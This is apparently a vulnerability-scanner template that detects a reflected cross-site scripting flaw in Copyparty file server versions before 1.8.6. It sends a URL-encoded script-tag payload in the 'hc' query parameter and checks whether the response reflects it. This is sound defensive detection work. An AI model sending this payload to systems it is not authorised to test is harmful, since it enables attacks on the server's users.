id: "copyparty-xss"
name: "Copyparty v1.8.6 - Cross-Site Scripting"
severity: "medium"
description: "Copyparty is a portable file server. Versions prior to 1.8.6 are subject to a reflected cross-site scripting (XSS) Attack. The vulnerability in the application's web interface could allow an attacker to execute malicious javascript code by tricking users into accessing a malicious link."
tech:
  - "generic"
tags:
  - "copyparty"
  - "xss"
  - "vuln"
cwe: "CWE-80"
reference: "https://github.com/9001/copyparty/security/advisories/GHSA-cw7j-v52w-fp5r"
spaExclusion: true
request:
  method: "GET"
  path: "/?hc=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
control:
  method: "GET"
  path: "/.kovo-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "<a href=\"/\"><script>alert(document.domain)</script>"
      - "choose your OS"
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 200
